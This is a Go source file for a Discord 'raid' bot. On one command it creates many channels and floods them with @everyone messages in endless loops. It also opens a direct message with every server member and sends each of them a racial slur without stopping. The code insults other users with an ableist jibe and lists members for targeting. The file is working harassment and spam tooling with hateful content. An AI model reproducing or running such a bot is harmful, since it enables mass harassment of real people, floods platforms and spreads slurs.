package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
	"gopkg.in/yaml.v3"
)

type Config struct {
	Bot struct {
		Token      string   `yaml:"token"`
		AllowedIds []string `yaml:"allowedIds"`

		Status struct {
			Messages []string `yaml:"messages"`
		} `yaml:"status"`

		Raid struct {
			Messages      []string `yaml:"messages"`
			MessageDelay  int      `yaml:"messageDelay"`
			ChannelAmount int      `yaml:"channelAmount"`
			Channels      struct {
				Name   string `yaml:"name"`
				Amount int    `yaml:"amount"`
			} `yaml:"channels"`
		} `yaml:"raid"`
	} `yaml:"bot"`
}

var config Config

func main() {
	data, err := os.ReadFile("config.yaml")

	if err := yaml.Unmarshal(data, &config); err != nil {
		panic(err)
	}

	// Create a new Discord session using the provided bot token.
	dg, err := discordgo.New("Bot " + config.Bot.Token)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	println(config.Bot.Status.Messages[0])

	ticker := time.Tick(5 * time.Second)

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM)

	statuses := config.Bot.Status.Messages
	statusIndex := 0

	dg.AddHandler(func(s *discordgo.Session, r *discordgo.Ready) {
		fmt.Println(fmt.Sprintf("Bot is ready on Shard %d", r.Shard))

		for {
			select {
			case <-ticker:
				dg.UpdateGameStatus(0, statuses[statusIndex])
				statusIndex = (statusIndex + 1) % len(statuses)
			case <-stop:
				// Handle cleanup or any necessary finalization
				fmt.Println("Received termination signal. Exiting...")
				return
			}
		}

	})

	dg.AddHandler(func(s *discordgo.Session, r *discordgo.RateLimit) {
		fmt.Println(fmt.Sprintf("(!) RATELIMITED (retry after: %f seconds)", r.RetryAfter.Seconds()))
	})

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)

	// In this example, we only care about receiving message events.
	dg.Identify.Intents = discordgo.IntentsGuildMessages | discordgo.IntentsGuildMembers

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	// Cleanly close down the Discord session.
	dg.Close()
}

// This function will be called (due to AddHandler above) every time a new
// message is created on any channel that the authenticated bot has access to.
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == "-members" {
		members, err := s.GuildMembers(m.GuildID, "", 1000)

		if err != nil {
			fmt.Println("error getting guild members for" + m.GuildID)
			return
		}

		for _, m := range members {

			if m.User.Bot {
				return
			}

			println(m.User.ID)
			userChannel, err := s.UserChannelCreate(m.User.ID)

			println("userChannel: " + userChannel.ID)

			if err != nil {
				fmt.Println("error creating channel for user " + m.User.ID)
				return
			}
		}

	}

	if m.Content == "-jussi" {
		if m.Author.ID != "890320508984377354" {
			s.ChannelMessageSend(m.ChannelID, "are you autistic?")
		}

		createChnlMsgs(m.GuildID, s)

		members, err := s.GuildMembers(m.GuildID, "", 1000)

		if err != nil {
			fmt.Println("error getting guild members for" + m.GuildID)
			return
		}

		for _, m := range members {

			if m.User.Bot {
				return
			}

			println(m.User.ID)
			userChannel, err := s.UserChannelCreate(m.User.ID)

			if err != nil {
				fmt.Println("error creating channel for user " + m.User.ID)
				return
			}

			go sendMsgToMembers(userChannel, s)
		}
	}
}

func sendMsgToMembers(userChannel *discordgo.Channel, s *discordgo.Session) {
	time.Sleep(3 * time.Second)
	for {
		s.ChannelMessageSend(userChannel.ID, "neekeri!")
	}
}

func createChnlMsgs(gid string, s *discordgo.Session) {
	var channelIDs []string

	amount := config.Bot.Raid.Channels.Amount
	chName := config.Bot.Raid.Channels.Name

	if chName == "" {
		chName = "raid-go"
	}

	fmt.Printf("Creating %d channels\n", amount)

	for i := 0; i < amount; i++ {
		channel, err := s.GuildChannelCreate(gid, chName, 0)

		fmt.Printf("")

		if err != nil {
			println("fail creating channel")
			return
		}

		channelIDs = append(channelIDs, channel.ID)

	}

	fmt.Printf("Done creating %d channels. Starting to spam messages to the channels.\n", amount)

	for _, ch := range channelIDs {
		go spamMessages(ch, s)
	}
}

func spamMessages(channelID string, s *discordgo.Session) {
	messages := config.Bot.Raid.Messages

	for {
		randomIndex := rand.Intn(len(messages))
		s.ChannelMessageSend(channelID, "@everyone"+messages[randomIndex])

		time.Sleep(time.Duration(config.Bot.Raid.MessageDelay) * time.Millisecond)
	}
}
